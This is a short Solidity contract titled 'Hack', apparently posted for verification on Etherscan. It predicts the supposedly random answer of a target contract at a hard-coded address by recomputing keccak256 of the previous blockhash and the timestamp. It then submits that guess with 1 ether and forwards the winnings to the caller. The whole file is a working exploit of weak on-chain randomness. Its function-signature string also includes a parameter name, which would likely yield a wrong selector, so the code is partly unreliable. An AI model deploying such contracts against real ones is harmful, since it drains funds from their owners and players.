/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

pragma solidity ^0.8.0;

contract Hack {
    address public otherAddr = 0x027406f738f7Dd6E78E1727510a7EAF9b0FAFC30;
    bytes funcbytes4;
    constructor() {
        funcbytes4 = abi.encodeWithSignature("guess(uint8 n)");
    }

    function GetFunc() public view returns (bytes memory){
        return funcbytes4;
    }

    function GetEth() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function AddEth() public payable {
    }

    function GuessOther() public payable {
        uint tmp = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        uint8 answer = uint8(tmp);
        (bool ret, bytes memory data) = (address(otherAddr)).call{value : 1 ether}(abi.encodePacked(funcbytes4, answer));
        require(ret);

        payable(msg.sender).transfer(address(this).balance);
    }

   
}